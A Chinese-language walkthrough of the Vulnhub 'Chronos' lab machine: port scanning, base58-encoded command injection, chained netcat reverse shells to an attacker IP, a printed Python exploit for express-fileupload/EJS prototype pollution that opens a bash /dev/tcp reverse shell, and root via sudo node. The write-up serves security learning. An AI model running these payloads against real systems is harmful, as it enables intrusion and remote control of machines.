## 第三周

​		**靶机名称**:Vulnhub------**Chronos**

​		**靶机链接**:https://www.vulnhub.com/entry/chronos-1,735/

​		**难度**:*medium*(巧妙无比)

​		**攻击机**:Kali Linux

​		**使用工具**:[CyberChef](https://gchq.github.io/CyberChef/)、[masscan](https://github.com/robertdavidgraham/masscan)、netdiscover

​		**强烈推荐教程**:[我们一起来打靶](https://pqy.h5.xeknow.com/s/2svbaU)

![推广](https://tva1.sinaimg.cn/large/008i3skNly1gtez9sj6vrj60u01hdgsv02.jpg)

**简述**:

这台靶机的漏洞利用方式与构思都十分巧妙,即使是简单的漏洞也需要通过十分巧妙的方式进行利用.同时我们可以学到数据编解码的姿势.

在打靶过程中,难免会遇到不会的内容,这时候我们就要学会利用搜索引擎进行搜索与快速学习,在攻击中成长.

这台靶机用到了CMS漏洞,学习各种CMS与代码审计是十分必要的!

### 主机发现~新工具*netdiscover*

锵锵~这次我们再来学习一个新的内网ARP主机发现工具,`netdiscover`

它的用法很简单,使用`sodu netdiscover -r IP/CIDR`即可进行一个网段的主机发现

我们使用`sudo netdiscover -r 10.0.0.0/16`

子网掩码建议在原有基础上**减去8**使用,由于扫描时使用的是多线程技术,所以我们可以把子网掩码-8,这样虽然扫描范围扩大一倍,但是扫描的线程数更多,速度会更快,效率更高.

当然,就按照原来的子网掩码进行配置也是可以哒~

![截屏2021-08-18 下午4.23.17](https://tva1.sinaimg.cn/large/008i3skNly1gtl0pa9xwrj610a0dq42a02.jpg)扫描结束,可以看到`10.0.0.28`应该就是我们的靶机啦,再看一眼mac地址,我们可以确定啦!

Ps:请参照第一周查看mac地址识别方法

### 常规扫描

老样子,我们对靶机进行全端口发现与端口服务扫描

`sudo nmap -p- 10.0.0.28`

咦,怎么全端口扫描这么慢!我们介绍一个新工具,如果只进行端口的发现的扫描,速度非常快!

#### 		超快的端口发现

[masscan](https://github.com/robertdavidgraham/masscan).此工具内置在kali中,可以直接开箱使用.

`sudo masscan -p- 10.0.0.28 --rate=500`使用`-p-`进行全端口扫描,使用`--rate`指定速度

注意,rate越大速度越快,但是错过端口的概率也随之增高

![截屏2021-08-18 下午5.00.18](https://tva1.sinaimg.cn/large/008i3skNly1gtl1rts91jj60wm07sdhm02.jpg)

PS:masscan与nmap在不同情境下扫描的速度均不一样.可能这一次nmap比较快,但是可能下一次masscan反而更快了.

区别在于masscan适用于做不精确的超多目标的少量端口发现,而nmap针对于单目标的准确度会更高!

发现了端口后,我们再使用nmap进行具体的服务扫描

`sudo nmap -p22,80,8000 -sV 10.0.0.28`![截屏2021-08-18 下午5.02.37](https://tva1.sinaimg.cn/large/008i3skNly1gtl1u5klhcj610w0aw0vj02.jpg)

发现了两个web页面:

​	一个是80,采用*Apache*搭建

​	一个是8000,采用*Node.js Express Framework*搭建

Apache我们都很熟悉了,但是*Node.js*不熟悉啊!	害怕,哭唧唧	:(

### web界面发现

我们先来查看80端口的web服务,发现什么功能都没有!只是文字而已...

![截屏2021-08-18 下午5.03.48](https://tva1.sinaimg.cn/large/008i3skNly1gtl1vep5ozj61140u0acz02.jpg)

​			**Date&Time?挺有意思的**

我们现在有两个选择,一是进行**目录爆破**,查找隐藏目录与功能,二是**查看当前页面的源代码**,看看有没有什么好东西~

我们在Firefox浏览器中使用快捷键*Ctrl+u*查看页面源代码![截屏2021-08-18 下午5.04.55](https://tva1.sinaimg.cn/large/008i3skNly1gtl1wk1222j61140u0q6o02.jpg)

仔细查看,发现没有表单等功能,但是有一段嵌入的*javascript*代码

我们把它拷贝下来

```javascript
    var _0x5bdf=['150447srWefj','70lwLrol','1658165LmcNig','open','1260881JUqdKM','10737CrnEEe','2SjTdWC','readyState','responseText','1278676qXleJg','797116soVTES','onreadystatechange','http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL','User-......
```

诶呀!为什么js代码这么乱啊!竟然没有缩进、分行.这也太难看了!

别着急,我们使用一款在线工具[Cyberchef](https://gchq.github.io/CyberChef/),这是一款非常强大的工具,其中包含有加解密,代码美化等多种功能

我们在左边的搜索栏搜索`Beautify`,选择`JavaScript Beautify`,然后拖动到*Recipe*中.

我们把杂乱的js代码拷贝到Input中,点击**BAKE!**,就可以看到美化后的代码啦~

```javascript
var _0x5bdf = [
	'150447srWefj',
	'70lwLrol',
	'1658165LmcNig',
	'open',
	'1260881JUqdKM',
	'10737CrnEEe',
	'2SjTdWC',
	'readyState',
	'responseText',
	'1278676qXleJg',
	'797116soVTES',
	'onreadystatechange',
	'http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL',
	'User-Agent',
	'status',
	'1DYOODT',
	'400909Mbbcfr',
	'Chronos',
	'2QRBPWS',
	'getElementById',
	'innerHTML',
	'date'
];
(function (_0x506b95, _0x817e36) {
	var _0x244260 = _0x432d;
	while (!![]) {
		try {
			var _0x35824b = -parseInt(_0x244260(126)) * parseInt(_0x244260(144)) + parseInt(_0x244260(142)) + parseInt(_0x244260(127)) * parseInt(_0x244260(131)) + -parseInt(_0x244260(135)) + -parseInt(_0x244260(130)) * parseInt(_0x244260(141)) + -parseInt(_0x244260(136)) + parseInt(_0x244260(128)) * parseInt(_0x244260(132));
			if (_0x35824b === _0x817e36)
				break;
			else
				_0x506b95['push'](_0x506b95['shift']());
		} catch (_0x3fb1dc) {
			_0x506b95['push'](_0x506b95['shift']());
		}
	}
}(_0x5bdf, 831262));
function _0x432d(_0x16bd66, _0x33ffa9) {
	return _0x432d = function (_0x5bdf82, _0x432dc8) {
		_0x5bdf82 = _0x5bdf82 - 126;
		var _0x4da6e8 = _0x5bdf[_0x5bdf82];
		return _0x4da6e8;
	}, _0x432d(_0x16bd66, _0x33ffa9);
}
function loadDoc() {
	var _0x17df92 = _0x432d, _0x1cff55 = _0x17df92(143), _0x2beb35 = new XMLHttpRequest();
	_0x2beb35[_0x17df92(137)] = function () {
		var _0x146f5d = _0x17df92;
		this[_0x146f5d(133)] == 4 && this[_0x146f5d(140)] == 200 && (document[_0x146f5d(145)](_0x146f5d(147))[_0x146f5d(146)] = this[_0x146f5d(134)]);
	}, _0x2beb35[_0x17df92(129)]('GET', _0x17df92(138), !![]), _0x2beb35['setRequestHeader'](_0x17df92(139), _0x1cff55), _0x2beb35['send']();
}
```



#### js代码分析

虽然经过了美化,代码的逻辑更加清晰了,但是好像大多数的内容都经过了编码,很难看出它在说什么...

俗话说得好,柿子要挑软的捏,我们仔细的看看,虽然许多函数名称都经过了加密,但是在这个数组中,有一串网址特别显眼.

`	http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`

我们发现有一串网址是没有经过加密的,而且我们还看到了`chronos.local:8000`熟悉的主机名,熟悉的端口

我们猜一猜,这前面的一段内容代表什么呢?

`chronos`就是我们这台靶机的名称,`local`是本机的意思.看来这个域名指的就是这台靶机它自己啊!

但是有一个小问题,当我们加载页面时,js去执行相关代码,可能会向这个地址发送请求.那么问题来了,由于这段域名是无法解析的,导致无法正常访问8000端口页面,获得内容.这就导致了某些功能加载不完全.这可怎么办!

既然dns解析不出来ip,那我们就替他‘解析’吧

修改`/etc/hosts`文件,将域名指向靶机的ip地址

`sudo vi /etc/hosts`		要注意,使用sudo权限进行更改

![截屏2021-08-18 下午5.08.51](https://tva1.sinaimg.cn/large/008i3skNly1gtl20linkuj61140u076t02.jpg)

现在我们再刷新一下页面,看看有没有变化呢~![截屏2021-08-18 下午5.09.56](https://tva1.sinaimg.cn/large/008i3skNly1gtl21qbhtwj617o0u0af602.jpg)

果然!我们看到了新内容,显示的是我们现在的时间.

既然这样,我们不妨看看在访问页面的过程中进行了哪些操作吧~

打开burp,设置代理.我们查看一下都有哪些请求![截屏2021-08-18 下午5.13.06](https://tva1.sinaimg.cn/large/008i3skNly1gtl2519wjhj617o0u0jwm02.jpg)

可以看到,发送了三个请求包.第一个获取的是根目录,其他两个访问了我们刚才修复的功能

第三个请求包特别有意思,它传递了format参数,并且参数的具体值似乎经过了某种加密

`/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`

还有一个特殊的地方,我们的请求头被修改为了`Chronos`,尝试修改请求头,发现返回了Permission Denied.看来这个还挺重要的吗~

我们在burp中点击右键,把它发送到Repeater模块,准备进一步的攻击.

#### 加密&解密

要想对参数进行修改,我们就必须先搞懂这是什么加密.

我们再次使用强大的工具CyberChef对其进行解密

搜索`Magic`模块,这是一个自动分析数据使用了什么加密方式的分析工具.

![截屏2021-08-18 下午5.17.23](https://tva1.sinaimg.cn/large/008i3skNly1gtl29j14loj618c0u0gqm02.jpg)

分析出来了!是base58!

点击右下角的Base58自动加载模块,进行解密.

有些同学会说:"我直接开始疑惑,base58是什么鬼?我只知道base64啊?"

其实base家族有很多成员,不只是base64,还有base32,base58等

但是他们都有一个共同点,加密是**可逆的**!

我们就可以通过工具对加密的数据进行解密修改,然后再加密回去,以达到修改数据的目的

扯回来,我们看看结果

`'+Today is %A, %B %d, %Y %H:%M:%S.'`

看着很眼熟啊!这有点像...像Linux中的`date`命令!

`data '+<formatexp>'`进行时间的格式化输出

既然这样,看来这一串数据是会被拼接到date命令后面的.

`data <input>`

诶~~既然有终端命令,我们不妨试试命令注入吧!

我们在Repeater中修改format为原内容`| which nc`,即`7yURkVR6w4FFJr`

![截屏2021-08-18 下午5.27.47](https://tva1.sinaimg.cn/large/008i3skNly1gtl2kbsecuj617o0u0n1702.jpg)

???奇怪,怎么报错了.难道是我们之前的推断有问题吗?

我们再试试其他命令.`&& ls` -->`5Jdixo4`

![截屏2021-08-18 下午5.35.49](https://tva1.sinaimg.cn/large/008i3skNly1gtl2sn4tb7j617o0u0tcw02.jpg)

咦?这不是可以的嘛?

我们先保留这个疑问,也许是服务端存在关键字过滤等防御措施.

这可就麻烦了,nc还能不能用呢?

我们尝试一下,`| nc 10.0.0.12 3333`->`PizXBGc1AfWVNZZn1vSKEFYCbU`进行连接测试,看看有没有nc.

嘿嘿,本地收到了反弹,看来是存在nc的

我们试试能不能用-e参数直接调用呢

`| nc 10.0.0.12 3333 -e /bin/bash`-> `9MYEjjMDbRMsDqUSBiJtxVPEL5LJAGQZ4gnECmgKamA7`

好家伙,就连tcp连接都没有.看来这个nc版本不支持-e参数了

​		没关系,我们上次学了个新姿势——nc串联!

`| nc 10.0.0.12 3333 | /bin/bash 2>&1 | nc 10.0.0.12 4444`

->`4My9wrA6cLNitCNnwS1w9mqxuhgefHaEQdn4qrTmHdU5HL2yFkFM7C9hWHq8JBkMQPEQpgN5hwVh5`

​		PS:详情请参考第二周打靶

啦啦~获得SHELL啦~

我们是`www-data`用户,权限比较低.当前目录下居然没有flag?!

我们看看/etc/passwd看看有哪些用户

![截屏2021-08-18 下午7.36.03](https://tva1.sinaimg.cn/large/008i3skNly1gtl69uqwqrj61620rmdqb02.jpg)

有个imera用户.我们去到它的home目录,发现了user.txt,但是只有它本人才能查看.

![截屏2021-08-18 下午7.37.29](https://tva1.sinaimg.cn/large/008i3skNly1gtl6b9ilggj61i802saaa02.jpg)

这....提权吧!

### 第一次提权

![截屏2021-08-18 下午5.47.23](https://tva1.sinaimg.cn/large/008i3skNly1gtl34p6k28j617o0u078g02.jpg)

我们使用cat指令查看一下文件内容吧~

为了阅读方便,我将文件内容写出来而不是使用截屏~

```json
//package.json
{
  "dependencies": {
    "bs58": "^4.0.1",
    "cors": "^2.8.5",
    "express": "^4.17.1"
  }
}
```

为什么我第一眼要来看它呢?

因为对于nodejs架构来说,几乎每一种架构下都会有package.json,里面写着依赖的库

可以看到bs58,这就是它用来加密传输的算法库

cors不知道,我们先跳过

express,这个就很出名啦!著名的nodejs开发框架.

我们再看看app.js

```javascript
//app.js
/ created by alienum for Penetration Testing
const express = require('express');
const { exec } = require("child_process");
const bs58 = require('bs58');
const app = express();
const port = 8000;
const cors = require('cors');

app.use(cors());
app.get('/', (req,res) =>{
    res.sendFile("/var/www/html/index.html");
});
app.get('/date', (req, res) => {
    var agent = req.headers['user-agent'];
    var cmd = 'date ';
    const format = req.query.format;
    const bytes = bs58.decode(format);
    var decoded = bytes.toString();
    var concat = cmd.concat(decoded);
    if (agent === 'Chronos') {
        if (concat.includes('id') || concat.includes('whoami') || concat.includes('python') || concat.includes('nc') || concat.includes('bash') || concat.includes('php') || concat.includes('which') || concat.includes('socat')) {
            res.send("Something went wrong");
        }
        exec(concat, (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
            res.send(stdout);
        });
    }
    else{
        res.send("Permission Denied");
    }
})
app.listen(port,() => {
    console.log(`Server running at ${port}`);
})
```

简单进行代码审计,在访问/date路径时首先检查了ua(User-agent),果然如之前所猜测的那样,进行了特殊的ua检测,不然就显示`Permission Denied`.

接下来就是对format参数进行解码,拼接到cmd后进行执行

中间有对关键字的检测,但是只检测,并没有防止指令的执行,这就导致了我们之前虽然输入`which nc`被拦截,但还是可以使用nc反弹shell.

真是十分粗心啊,居然没有阻止我们,嘿嘿~

可惜的是,我们并没有在这里找到提权的有关信息.这可咋整?顶着`www-data`还能干啥?

我们再试试其他几种提权方式

`sudo -l`,内核漏洞,suid文件查找

结果呢,都失败了...![截屏2021-08-18 下午6.05.55](https://tva1.sinaimg.cn/large/008i3skNly1gtl3nyxvhrj61jw0awjte02.jpg)

sudo没有权限;find找不到suid文件;内核版本又这么高,根本没有漏洞!

这下咋整?

#### 还是熟悉的信息收集

~诶~

既然常规的没有用,那我们就在这台主机上多看看,看看有没有什么敏感文件之类的~

我们使用`pwd`查看当前目录,发现在`/opt/chronos`中

我们使用`cd ..`返回上级目录,ls查看一下

```shell
ls
	chronos
	chronos-v2
```

哟,发现了`chronos-v2`,有点意思,我们看看

进去后,使用`ls -la`

![截屏2021-08-18 下午6.10.22](https://tva1.sinaimg.cn/large/008i3skNly1gtl3sler0dj60py07y75l02.jpg)

wow,root权限~	真的是root吗?

我们看看,有前端,后端.肯定看后端啊!

进入后端查看![截屏2021-08-18 下午6.12.54](https://tva1.sinaimg.cn/large/008i3skNly1gtl3v8hmbhj60r2072myv02.jpg)

还是熟悉的操作,熟悉的文件.我们看看package.json吧~

```json
{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}
```

我们康康~里面写了main为`server.js`,即主程序,一会我们去看看~

其中使用了`ejs`、`express`、`express-fileupload`模块,诶!fileupload!

文件上传?也许是突破点呢!

```javascript
//server.js
const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
   console.log('Server listening on ' + addr + ' port ' + port);
});
```

开放在8080端口?看到这里,我相信你已经不奇怪为什么我们之前没有扫描到这个web服务了

绑定的地址在127.0.0.1,看来这正是为我们在这个时候准备的.希望很大!

此处有一个特殊的设置,`app.use(fileupload({ parseNested: true }));`

我们都知道,造成漏洞最多的原因就是因为配置错误.我们不妨搜索一下`express-fileupload`的相关内容

#### 搜索引擎——GIYF

*“Google Is Your Friend”*

​					——沃·兹基硕德

大家都说,搜索引擎是渗透测试人员最好的朋友,在渗透的过程中,我们很可能遇到自己不会的内容.这个时候我们就需要通过搜索引擎进行搜索,进行快速地学习,这样才能解决不同的问题.

**这种能力是非常重要的!**

在百度搜索好像没有太多的内容,

我们去google科学搜索一下吧~

[link](https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/)搜到啦~注意,这个链接需要科学上网才可以访问

但是这个页面指向了这个漏洞的发现者的博客,我们去看看!

[blog](https://blog.p6.is/Real-World-JS-1/)

对这个漏洞的利用需要ejs框架和parseNested开启,这正是我们有的!

看来这个漏洞势在必得!

```python
import requests
LHOST='10.0.0.12'  # Change it
LPORT='5555'	# Change it
RHOST='127.0.0.1'	# Change it
RPORT='8080'	# Change it
cmd = 'bash -c "bash -i &> /dev/tcp/'+LHOST+'/'+LPORT+' 0>&1"'
# pollute
requests.post('http://'+RHOST+':'+RPORT, files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

# execute command
requests.get('http://'+RHOST+':'+RPORT)
```

我们在博客中找到了作者的exp模版,我们进行修改,上传

在kali使用`python3 -m http.server 80`开启web(文件传输)服务,

在靶机进入`/tmp`目录,使用`wget http://10.0.0.12/exp.py`获取exp.py文件

执行一下!

![截屏2021-08-18 下午7.22.20](https://tva1.sinaimg.cn/large/008i3skNly1gtl5vkl2boj60yk08qac602.jpg)

Wow,成功了!是root吗?咦?不是?

这才想起来,我们还没有获得userflag呢.这下我们是imera用户,可以看看user.txt啦~![截屏2021-08-18 下午7.39.07](https://tva1.sinaimg.cn/large/008i3skNly1gtl6cz9eobj60gg03eq3b02.jpg)

获得user flag--`byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK`

### 第二次提权

还是老三样,内核,suid,sudo

我们查看`sudo -l`![截屏2021-08-18 下午7.43.03](https://tva1.sinaimg.cn/large/008i3skNly1gtl6h2g4vnj615e09241002.jpg)

WOW,有惊喜!我们可以使用root权限在没有密码的情况下运行node,执行javascript文件

这不是手到擒来吗!我们之前使用过python反弹shell,nodejs其实是一样的道理,只是编写shell的语言不同罢了~

这里推荐一个本地提权命令的网站,里面包含了多种通过linux二进制文件进行提权的方式

https://GTFOBins.github.io

感谢"我们一起来打靶"交流群的"**Nacl🔥**"师傅分享此网站

***Ps:强烈推荐教程,群里的同学互相帮助,学习氛围非常好!***

`sudo node -e "child_process.spawn('/bin/bash',{stdio: [0,1,2]})"`

![截屏2021-08-18 下午7.51.58](https://tva1.sinaimg.cn/large/008i3skNly1gtl6qdk2vqj610i08gmyy02.jpg)

PWN!

root到手啦~~~~

root-flag		`YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK`

## 彩蛋

不知道你有没有发现,这两个flag都很像我们之前的加密数据.我们试试~

User-flag  --base64> `o chronos pernaei file mou`

Root-flag  --base64> `apopse siopi mazeuoume oneira`

```
o chronos pernaei file mou->时间过去了我的朋友
apopse siopi mazeuoume oneira->今夜寂静，我们聚梦
```

~时间过去了我的朋友~

~今夜寂静,我们聚梦~

## 总结

这次这个靶机十分的有意思啊~

在扫描阶段,我们发现了神奇的nodejs框架.在源码分析中发现了加密的js代码

我们对其中独树一帜的网址进行查看,修改hosts解析文件启动该功能

我们加载burp查看新功能api,对format参数进行智能解码,发现是base58

我们将计就计,发现参数内容很像是date命令的参数,怀疑存在命令注入,通过nc串联获得shell

在获得www-data权限的shell后,我们开始慢慢提权路

首先对当前目录chronos进行代码审计,没有发现提权点

到上级目录,对chronos-v2进行代码审计,发现了express-fileupload模块

秉承着**GIYF**的原则,我们对这个模块进行搜索,终于功夫不负有心人,搜索到了利用框架

最后使用sudo权限执行node脚本提升root权限,获取shell

整个靶机下来,我们深刻地感受到了信息收集的重要性.当你发现一个框架,你不知道有什么漏洞,那就去Google啊!

遇到问题时,一定要学会自己去尝试解决,不要一味的依赖他人!

在问题中学习,在解决中成长.这才是最正确的网络安全学习之道!

## 附录

linux提权网站:		https://GTFOBins.github.io

## 致谢

**\~小杨🐑\~**

**~Nacl🔥~**

